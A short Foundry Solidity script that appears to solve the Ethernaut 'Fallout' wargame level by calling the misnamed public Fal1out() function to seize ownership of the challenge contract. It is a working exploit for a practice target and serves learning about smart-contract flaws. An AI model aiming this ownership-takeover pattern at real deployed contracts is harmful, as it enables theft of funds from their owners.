// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { Fallout } from "ethernaut/L1.fallout.sol";

contract FalloutCrackerScript is Script {
  function run() external {
    Fallout fallout = Fallout(vm.envAddress("ETHERNAUT_FALLOUT_ADDRESS"));
    address wallet = vm.envAddress("WALLET_ADDRESS");

    vm.broadcast(wallet);
    fallout.Fal1out();

    assert(fallout.owner() == wallet);
    assert(address(fallout).balance == 0);
  }
}
